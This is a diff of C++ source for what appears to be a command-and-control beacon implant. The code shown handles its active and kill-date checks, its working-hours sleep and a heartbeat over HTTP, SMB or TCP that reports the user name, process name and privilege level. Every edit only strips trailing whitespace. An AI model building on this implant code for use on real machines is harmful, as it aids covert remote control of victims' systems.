@@ -8,7 +8,7 @@ Agent::Agent()
 {
 	info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
 	*info = AgentInfo();
-	
+
 	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
 	*config = AgentConfig();
 
@@ -48,7 +48,7 @@ BOOL Agent::IsActive()
 	return this->config->active && !(this->config->kill_date && now >= this->config->kill_date);
 }
 
-ULONG Agent::GetWorkingSleep() 
+ULONG Agent::GetWorkingSleep()
 {
     if ( !this->config->working_time )
         return 0;
@@ -85,7 +85,7 @@ ULONG Agent::GetWorkingSleep()
 BYTE* Agent::BuildBeat(ULONG* size)
 {
 	BYTE flag = 0;
-	flag += this->info->is_server; 
+	flag += this->info->is_server;
 	flag <<= 1;
 	flag += this->info->elevated;
 	flag <<= 1;
@@ -125,12 +125,12 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
 	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));
 
-#if defined(BEACON_HTTP) 
+#if defined(BEACON_HTTP)
 
 	ULONG beat_size = packer->datasize();
 	PBYTE beat      = packer->data();
 
-#elif defined(BEACON_SMB) 
+#elif defined(BEACON_SMB)
 
 	ULONG beat_size = packer->datasize() + 4;
 	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
@@ -141,7 +141,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	PBYTE pdata = packer->data();
 	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
 
-#elif defined(BEACON_TCP) 
+#elif defined(BEACON_TCP)
 
 	ULONG beat_size = packer->datasize() + 4;
 	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
